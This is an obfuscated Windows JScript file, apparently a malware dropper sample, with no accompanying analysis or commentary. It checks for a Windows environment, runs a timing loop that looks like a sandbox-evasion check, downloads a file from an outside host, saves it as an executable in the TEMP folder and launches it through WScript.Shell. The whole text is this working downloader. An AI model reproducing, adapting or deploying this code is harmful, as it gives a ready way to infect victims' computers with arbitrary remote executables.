var _D = false;
var _UL = "CreateObject";
var _M0 = function _UT() {return WScript[_UL]("WScript"+".Shell");}(), _NV = 11;
var _LU = "MSXML2.XMLHTTP";
var _DD = 2123213;
var _J = 0;
function _WL(_KU){_M0["Run"](_KU, _J, _J);};
function _YF(){return _LU + "";};
function _U(_BN, _OA){_J = _J * 1; return _BN - _OA;};
function _I(){return _UL;};
/*@cc_on
  @if (@_win32 || @_win64)
    _D = true;
  @end
@*/
if (_D)
{
var _TI = "";
function _X(){return 22;};
var _JF = 0; var _TD = 0;
function _UT0()
{
var _JG = new this["Date"]();
var _Q = _JG["getUTCMilliseconds"]();
WScript["Sleep"](_X());
var _JG = new this["Date"]();
var _QZ = _JG["getUTCMilliseconds"]();
WScript["Sleep"](_X());
var _JG = new this["Date"]();
var _LZ = _JG["getUTCMilliseconds"]();
var _JF = "_KN";
_JF = _U(_QZ, _Q);
var _TD = "_J0";
_TD = _U(_LZ, _QZ);
_TI = "open";
return _U(_JF, _TD);
}
var _XX = false;
var _F = false;
for (var _BO = _J; _BO < _X() * 1; _BO++){if (_UT0() != _J){
_XX = true; 
_TD = "31" + 11 * _JF + _TD; 
_F = true; 
break;
}}
function _M() {return ((_XX == true) && (_XX == _F)) ? 1 : _J;};
if (_XX && _M() && _F){
function _HP() {return _M0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "HNNQYiRouqoC6Q6.ex" + "e";};
 _DM = _YF();
 _J1 = WScript[_UL](_DM);
 var _HB = 1;
 while (_HB){
try {
	if (_HB == 1)
	{
		_J1[_TI]("GET", "http://bqsc.pt/c6ska", false);
		_J1["send"]();
		_QP = "Sleep";
	}
	WScript[_QP](_X() + 120); 
	if (_J1["readystate"] < 2 * 2) continue;
	_HB = _J;
	function _NF(_R) {var _I0 = (1, 2, 3, 4, 5, _R); return _I0;};
	_L = WScript[_I()]("ADODB.Stream");
	_DM = _L;
	_DM[_TI]();
	_DM["type"] = _NF(1);
	_DM["write"](_J1["ResponseBody"]);
	_L["position"] = _NF(_J);
	_DM["Save" + "ToFile"](_HP(), 2);
	_L["cl"+"ose"]();
	_TN = _HP();
	_WL(_TN);
} catch(_R0){};
}
}
}

